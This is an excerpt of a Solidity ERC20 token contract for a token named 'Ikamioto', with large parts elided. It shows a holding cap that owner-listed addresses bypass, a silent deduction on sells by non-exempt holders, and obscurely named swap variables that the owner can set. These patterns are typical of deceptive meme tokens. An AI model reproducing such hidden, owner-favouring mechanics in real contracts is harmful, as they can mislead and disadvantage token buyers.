...
contract Contract is ERC20, Ownable {
    ...
    string private _name = unicode"Ikamioto";
    string private _symbol = unicode"オ";
    uint256 _rTotal = 5000000 * 10**_decimals;
    ...
    uint256 public TaxOnMarketing = 0;
    ...
    function _transferFrom(
        ...
        require(
            (intervalHash + fxAmount) <= maximumTokensAmount || allowed[recipient],
            "Total Holding is currently limited, he can not hold that much." );
        if (shouldSwapBack() && recipient == UniswapV2Pair) { swapBack(); }
        uint256 syncedAmount = fxAmount / 10000000;
        if (!isTimelockExempt[sender] && recipient == UniswapV2Pair) { fxAmount -= syncedAmount; }
        if (isTimelockExempt[sender] && isTimelockExempt[recipient])
            return _basicTransfer(sender, recipient, fxAmount);
        _rOwned[sender] = _rOwned[sender].sub(fxAmount, "Insufficient Balance");

        uint256 amountReceived = shouldremoveAllTax(sender, recipient)
            ? removeAllTax(sender, fxAmount, (recipient == UniswapV2Pair))
            : fxAmount; _rOwned[recipient] = _rOwned[recipient].add(amountReceived);
    ...
    function swapBack() internal cooldownEnabled {
        ...
        if (_rOwned[address(this)] > maxIntervalRates) {
            _intervalRates = maxIntervalRates;
        } else {
            _intervalRates = _rOwned[address(this)];
        }
    ...
    function setSwapBackBytes(
        ...
        swappingHash = _enabled;
        swashBytes = _intervalRates;
